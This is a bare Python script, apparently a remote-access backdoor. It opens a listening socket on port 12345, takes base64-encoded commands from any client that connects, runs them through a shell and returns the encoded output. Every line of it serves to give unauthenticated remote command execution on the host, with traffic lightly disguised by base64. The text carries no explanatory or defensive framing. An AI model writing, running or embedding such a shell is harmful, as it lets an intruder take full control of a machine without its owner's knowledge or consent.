import base64
import socket
import subprocess
import os


Host= socket.gethostname()
local_ip= socket.gethostbyname(Host)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((local_ip, 12345))
print("Socket bind complete")
s.listen()
print("Socket listening complete")
conn, addr = s.accept()
print("Connected by", addr)
while True:
  command_bytes = conn.recv(1024)
  if not command_bytes:
    break

  command_input = base64.b64decode(command_bytes).decode("utf-8").strip()

  if command_input == "exit":
    conn.close()
    break

  try:
    if command_input.startswith("cd "):
      target_dir = command_input[3:].strip()
      os.chdir(target_dir)
      output = f"Directory changed to: {os.getcwd()}\n"

    else:
      result = subprocess.run(
          command_input,
          shell=True,
          stdout=subprocess.PIPE,
          stderr=subprocess.PIPE,
          text=True,
      )
      output = result.stdout + result.stderr
      if not output:
        output = "Command executed with no output."

  except Exception as e:
    output = f"Error: {str(e)}"


  conn.send(base64.b64encode(output.encode("utf-8")))




